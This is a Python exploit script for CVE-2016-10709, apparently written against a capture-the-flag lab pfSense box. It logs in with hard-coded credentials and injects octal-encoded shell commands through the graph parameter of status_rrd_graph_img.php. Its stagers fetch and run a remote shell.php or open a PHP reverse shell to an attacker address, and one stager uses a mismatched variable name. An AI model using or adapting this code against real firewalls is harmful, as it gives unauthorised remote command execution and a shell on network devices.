#########################
# CVE-2016-10709        #
#########################

import requests
import re
import warnings
warnings.filterwarnings("ignore")

TARGET = 'https://10.10.10.60'

# STAGER ===================================
stager = (
        'echo \'<?php $shell = file_get_contents("http://10.10.16.3:8000/shell.php");' +
    'file_put_contents("shell.php", $shell);' +
    'system("chmod 755 shell.php && ./shell.php"); ?> \' > shellexec'
)
stager = (
        'echo \'$mysock=fsockopen("10.10.16.3",9001);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\' > shellexec')
encoded_stager = ''
for c in stager:
    encoded_stager += "\\\\%03d" %(int(oct(ord(c))[2:]))

# MAKE REQUESTS ============================
s = requests.Session()
r = s.get(TARGET + '/index.php', verify=False)
csrf_re = re.search(r'.*csrfMagicToken = "(.*?)"', r.text)
csrf = csrf_re.groups(1)[0]

data = {
    '__csrf_magic': csrf,
    'usernamefld': 'rohit',
    'passwordfld': 'pfsense',
    'login': 'Login'
}
r = s.post(TARGET + '/index.php', data=data, verify=False)

r = s.get(TARGET + '/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf ' + encoded_stager + '|sh|echo', verify=False)
# print(r.text)

r = s.get(TARGET + '/status_rrd_graph_img.php?database=-throughput.rrd&graph=file|id|echo', verify=False)
print(r.text)

data = {
    'database': '-throughput.rrd',
    'graph': 'file|php shellexec|echo '
}
s.post(TARGET + '/status_rrd_graph_img.php', data=data, verify=False)
